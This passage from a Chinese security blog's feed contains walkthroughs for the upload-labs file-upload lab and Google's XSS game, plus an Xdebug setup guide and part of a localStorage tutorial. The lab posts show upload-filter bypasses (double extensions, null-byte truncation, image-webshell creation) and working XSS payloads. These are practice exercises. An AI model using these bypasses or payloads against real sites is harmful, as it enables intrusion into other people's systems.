class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]); <span class="comment">//去除首尾空白字符</span></span><br><span class="line">        <span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);<span class="comment">//若存在黑名单的php中的字符串，则替换成空</span></span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;  php</span><br></pre></td></tr></table></figure><p>分析：见注释</p><p>绕过：后缀名双写绕过</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200626134549096.png" alt="image-20200626134549096"></p><h2 id="PASS-11"><a href="#PASS-11" class="headerlink" title="PASS-11"></a>PASS-11</h2><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>); <span class="comment">//获取文件后缀名</span></span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这次使用的是白名单防御，但是抓包发现可以控制路径</p><p>绕过</p><ul><li>00%截断</li></ul><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200626140705332.png" alt="image-20200626140705332"></p><p>看到上传路径后面虽然有jpg，但是前面有00截断，系统会认为这是一个结束字符</p><h2 id="PASS-12"><a href="#PASS-12" class="headerlink" title="PASS - 12"></a>PASS - 12</h2><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">   <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">   <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">       <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">       <span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure><ul><li>与上一关不同的是这次是post修改文件路径</li><li>00截断，不过这次实在hex中添加，因为POST不会对%00进行解码</li></ul><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200627103108697.png" alt="image-20200627103108697"></p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200627103238741.png" alt="image-20200627103238741"></p><h2 id="PASS-13"><a href="#PASS-13" class="headerlink" title="PASS - 13"></a>PASS - 13</h2><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = fopen(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = fread(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @unpack(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = intval(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>分析：对文件头进行了校验</li><li>绕过<ul><li>上传图片马</li></ul></li></ul><p>首先制作图片马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.jpg/a + phpinfo.php/b info.png</span><br></pre></td></tr></table></figure><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200627103748031.png" alt="image-20200627103748031"></p><p>上传后进行包含</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200627104019385.png" alt="image-20200627104019385"></p><h2 id="PASS-14"><a href="#PASS-14" class="headerlink" title="PASS - 14"></a>PASS - 14</h2><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$info</span> = getimagesize(<span class="variable">$filename</span>); <span class="comment">//</span></span><br><span class="line">        <span class="variable">$ext</span> = image_type_to_extension(<span class="variable">$info</span>[<span class="number">2</span>]); <span class="comment">// 取得图像类型的文件后缀</span></span><br><span class="line">        <span class="keyword">if</span>(stripos(<span class="variable">$types</span>,<span class="variable">$ext</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>分析：<ul><li>相比上一关，对文件的类型进行了判断，getimagesize()用于获取上传的文件类型</li></ul></li><li>绕过<ul><li>同样上传图片马</li></ul></li></ul><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200627111533697.png" alt="image-20200627111533697"></p><h2 id="PASS-15"><a href="#PASS-15" class="headerlink" title="PASS - 15"></a>PASS - 15</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    <span class="variable">$image_type</span> = exif_imagetype(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>用exif_imagetype对上传的文件类型进行了判断</li><li>上传图片马绕过</li></ul><h2 id="PASS-16"><a href="#PASS-16" class="headerlink" title="PASS - 16"></a>PASS - 16</h2><p>ping = str1(IP(dst=’’,ttl=1,id=175)/ICMP(id=188,seq=1)/b’welcome ‘)</p><p>ping.getlayer(ICMP).fields //截取ICMP包里的值</p><p>ping.getlayer(ICMP).fields .[‘值’]//截取ICMP包里的值</p><p><a href="https://www.freebuf.com/articles/web/179954.html">https://www.freebuf.com/articles/web/179954.html</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;靶场github：&lt;a href=&quot;https://github.com/c0ny1/upload-labs&quot;&gt;https://github.com/c0ny1/upload-labs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;照着大佬的思维导图学习</summary>
    
    
    
    
    <category term="安全" scheme="http://example.com/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Windows下vscode配置PHP动态调试环境</title>
    <link href="http://example.com/2019/06/20/windows%E4%B8%8Bvscode%E9%85%8D%E7%BD%AEphp%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/"/>
    <id>http://example.com/2019/06/20/windows%E4%B8%8Bvscode%E9%85%8D%E7%BD%AEphp%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/</id>
    <published>2019-06-19T16:00:00.000Z</published>
    <updated>2021-10-25T05:15:38.591Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>所需网址：<a href="https://xdebug.org/wizard">https://xdebug.org/wizard</a> <span id="more"></span></p><h2 id="获取xdebug文件"><a href="#获取xdebug文件" class="headerlink" title="获取xdebug文件"></a>获取xdebug文件</h2><p>打开上述网址，将自己环境下phpinfo()内容全部复制到方框中，然后点击下面的分析按钮：</p></li></ul><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200619122200415.png" alt="image-20200619122200415"></p><p>分析完成后，页面会出现这段文字</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200619122521176.png" alt="image-20200619122521176"></p><h2 id="配置php-ini"><a href="#配置php-ini" class="headerlink" title="配置php.ini"></a>配置php.ini</h2><p>根据步骤下载文件，并将他放在指定的路径中后，打开当前php版本的php.ini，增加下面的内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  xdebug.remote_enable = True</span><br><span class="line">  xdebug.remote_autostart = True</span><br><span class="line">zend_extension = E:\phpstudy\PHPTutorial\php\php-7.2.1-nts\ext\php_xdebug-2.9.6-7.2-vc15-nts.dll</span><br></pre></td></tr></table></figure><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200619122737445.png" alt="image-20200619122737445"></p><h2 id="配置vscode"><a href="#配置vscode" class="headerlink" title="配置vscode"></a>配置vscode</h2><p>打开vscode，安装PHP debug插件</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200619122830310.png" alt="image-20200619122830310"></p><p>ctrl+, 搜索设置：<code>php.validate.executablePath</code>，点击edit</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200619150643353.png" alt="image-20200619150643353"></p><p>将本机环境的php执行exe路径填入文件中：</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200619150743964.png" alt="image-20200619150743964"></p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><ul><li><p>点击vscode的debuger按钮，进入后</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200619150836641.png" alt="image-20200619150836641"></p></li><li><p>open a folder后，界面会改变：</p></li></ul><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200619151115865.png" alt="image-20200619151115865"></p><p>点击后，编辑launch.json，选择PHP：</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200619151248866.png" alt="image-20200619151248866"></p><p>vscode会自动创建拥有如下内容的json文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    // Use IntelliSense to learn about possible attributes.</span><br><span class="line">    // Hover to view descriptions of existing attributes.</span><br><span class="line">    // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387</span><br><span class="line">    &quot;version&quot;: &quot;0.2.0&quot;,</span><br><span class="line">    &quot;configurations&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;Listen for XDebug&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;php&quot;,</span><br><span class="line">            &quot;request&quot;: &quot;launch&quot;,</span><br><span class="line">            &quot;port&quot;: 9000</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;Launch currently open script&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;php&quot;,</span><br><span class="line">            &quot;request&quot;: &quot;launch&quot;,</span><br><span class="line">            &quot;program&quot;: &quot;$&#123;file&#125;&quot;,</span><br><span class="line">            &quot;cwd&quot;: &quot;$&#123;fileDirname&#125;&quot;,</span><br><span class="line">            &quot;port&quot;: 9000</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200619151404201.png" alt="image-20200619151404201"></p><p>然后在run那里点击listen for xdebuger，再浏览器访问想要调试的文件就可以看到相应的调试信息了</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200619151859144.png" alt="image-20200619151859144"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>改文件一定要备份。。说多了都是泪啊</li></ul>]]></content>
    
    
    <summary type="html">&lt;ul&gt;
&lt;li&gt;&lt;p&gt;所需网址：&lt;a href=&quot;https://xdebug.org/wizard&quot;&gt;https://xdebug.org/wizard&lt;/a&gt;</summary>
    
    
    
    
    <category term="环境搭建" scheme="http://example.com/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>Google-XSS-game</title>
    <link href="http://example.com/2019/06/17/google-xss/"/>
    <id>http://example.com/2019/06/17/google-xss/</id>
    <published>2019-06-16T16:00:00.000Z</published>
    <updated>2021-10-25T05:11:58.594Z</updated>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>地址：<a href="https://xss-game.appspot.com/level2">https://xss-game.appspot.com/level2</a><span id="more"></span></p><h2 id="01"><a href="#01" class="headerlink" title="01"></a>01</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="02"><a href="#02" class="headerlink" title="02"></a>02</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onclick=alert(1)&gt;</span><br></pre></td></tr></table></figure><h2 id="03"><a href="#03" class="headerlink" title="03"></a>03</h2><p>代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">chooseTab</span>(<span class="params">num</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Dynamically load the appropriate image.</span></span><br><span class="line">  <span class="keyword">var</span> html = <span class="string">&quot;Image &quot;</span> + <span class="built_in">parseInt</span>(num) + <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  html += <span class="string">&quot;&lt;img src=&#x27;/static/level3/cloud&quot;</span> + num + <span class="string">&quot;.jpg&#x27; /&gt;&quot;</span>;</span><br><span class="line">  $(<span class="string">&#x27;#tabContent&#x27;</span>).html(html);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">window</span>.location.hash = num;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Select the current tab</span></span><br><span class="line">  <span class="keyword">var</span> tabs = <span class="built_in">document</span>.querySelectorAll(<span class="string">&#x27;.tab&#x27;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; tabs.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (tabs[i].id == <span class="string">&quot;tab&quot;</span> + <span class="built_in">parseInt</span>(num)) &#123;</span><br><span class="line">      tabs[i].className = <span class="string">&quot;tab active&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      tabs[i].className = <span class="string">&quot;tab&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Tell parent we&#x27;ve changed the tab</span></span><br><span class="line">  top.postMessage(self.location.toString(), <span class="string">&quot;*&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">  chooseTab(<span class="built_in">unescape</span>(self.location.hash.substr(<span class="number">1</span>)) || <span class="string">&quot;1&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Extra code so that we can communicate with the parent page</span></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&quot;message&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (event.source == parent) &#123;</span><br><span class="line">    chooseTab(<span class="built_in">unescape</span>(self.location.hash.substr(<span class="number">1</span>)));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p>html中关键点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;/static/level3/cloud3.jpg&quot;&gt;</span><br></pre></td></tr></table></figure><p>分析</p><ul><li>self.location.hash ：获取URL#号后面的内容</li><li>unescape()：不用url解码</li><li>chooseTab()：将#后面输入的图片编码加入img标签中</li></ul><p>清晰了利用点，就是#后面的内容会被拼接到html中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xss-game.appspot.com/level3/frame#3&#x27; onclick=&#x27;alert(1)&#x27;;</span><br></pre></td></tr></table></figure><h2 id="04"><a href="#04" class="headerlink" title="04"></a>04</h2><p>输入的东西会拼接到这里</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200702162525098.png" alt="image-20200702162525098"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;);alert(1);var x=(&#x27;</span><br></pre></td></tr></table></figure><h2 id="05"><a href="#05" class="headerlink" title="05"></a>05</h2><p>next可控</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200702163502905.png" alt="image-20200702163502905"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在url上输入：</span><br><span class="line">next=javascript:alert(1)</span><br></pre></td></tr></table></figure><h2 id="06"><a href="#06" class="headerlink" title="06"></a>06</h2><p>url里#后面的内容会拼接到script标签的src中，但是过滤了http，而且必须使用https协议</p><ul><li>大小写绕过</li><li>一种解法远程加载js代码</li></ul><p>googleAPI</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">htTps://www.google.com/jsapi?callback=alert</span><br></pre></td></tr></table></figure><ul><li>第二种解法：data:text,alert(1)</li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h1&gt;&lt;p&gt;地址：&lt;a href=&quot;https://xss-game.appspot.com/level2&quot;&gt;https://xss-game.appspot.com/level2&lt;/a&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript实现web浏览器本地存储</title>
    <link href="http://example.com/2018/12/18/JavaScript%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8/"/>
    <id>http://example.com/2018/12/18/JavaScript%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8/</id>
    <published>2018-12-17T16:00:00.000Z</published>
    <updated>2021-10-25T05:12:13.083Z</updated>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>山山师傅出的第一个小任务，用JavaScript实现web浏览器的本地存储：模拟百度搜索历史记录，将搜索过的内容用本地存储保存并显示出来。这是一篇小白水文。<span id="more"></span></p><h2 id="localstorage"><a href="#localstorage" class="headerlink" title="localstorage"></a>localstorage</h2><p>localstorage的主要函数有</p><blockquote><p>localstorage.setItem(‘属性名’,’属性值’) : 存入lo</p></blockquote><blockquote><p>localstorage.getItem(‘属性名’)：读取</p></blockquote><blockquote><p>localstorage.clear()：删除</p></blockquote><p>本次存入的数据使用数组方式存入，但是localstorage的存储不支持数组类型，所以要用到JSON的两个函数JSON.stringify()和JSON.parse()，在存数据时将数组序列化成字符串，取出数据时将数据序列化成对象，然后再将对象转化为数组，便于比较和去重。<br>下面两张图来展现一下这几个函数的用法</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/1571747587921-f2fe03a7-4dfc-41b3-88ef-a517172dcee7.png" alt="img"></p><p><strong>PS：此处插播一个遇到的小小问题，就是之前测试时存入数据如果没有用JSON.stringify()将数据转换成相应的JSON 格式的话，那后面如果想用JSON.parse()读取数据是会报错的，因为存入的数据不是JSON格式的，所以解析的时候会报错。</strong></p><h2 id="JS代码"><a href="#JS代码" class="headerlink" title="JS代码"></a>JS代码</h2><h3 id="存储"><a href="#存储" class="headerlink" title="存储"></a>存储</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 